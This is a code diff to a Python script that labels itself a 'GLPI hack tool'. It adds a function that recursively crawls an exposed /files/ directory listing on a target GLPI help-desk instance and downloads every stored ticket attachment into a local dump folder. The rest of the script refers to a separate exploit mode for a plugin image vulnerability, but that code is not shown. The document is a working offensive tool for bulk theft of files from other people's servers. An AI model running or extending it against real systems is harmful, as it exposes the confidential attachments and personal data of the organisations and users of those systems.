@@ -2,6 +2,9 @@
 import requests
 import re
 import argparse
+from urllib.request import Request, urlopen, urlretrieve
+from bs4 import BeautifulSoup
+import os
 parser = argparse.ArgumentParser(description='GLPI hack tool')
 parser.add_argument('--url', help="URL of the GLPI instance", required=True)
 parser.add_argument('--dumpfiles',help="Dump the stored ticket attachments", action="store_true")
@@ -47,8 +50,28 @@ def dumpFiles():
     if not checkFiles():
         print("Directory listing is not enabled on /files. use --exploit to exploit the pulginimage vulnerability.")
     else:
-        print("Dumping files")
-        
+        read_url(args.url + "/files/")
+
+def read_url(url):
+    url = url.replace(" ","%20")
+    req = Request(url)
+    a = urlopen(req).read()
+    soup = BeautifulSoup(a, 'html.parser')
+    x = (soup.find_all('a'))
+    for i in x:
+        file_name = i.extract().get_text()
+        url_new = url + file_name
+        url_new = url_new.replace(" ","%20")
+        if(file_name[-1]=='/' and file_name != 'Name' and file_name != 'Last Modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
+            read_url(url_new)
+        if (file_name[-1] != '/' and file_name != 'Name' and file_name != 'Last modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
+            res = requests.get(url_new)
+            filename = url_new.split('files/')[1:]
+            filename = "./dump/" + "".join(filename)
+            print(filename)
+            os.makedirs(os.path.dirname(filename), exist_ok=True)
+            with open(filename, "wb") as f:
+                f.write(res.content)            
 
 def exploit():
     if checkVulnerable() and not checkFiles():
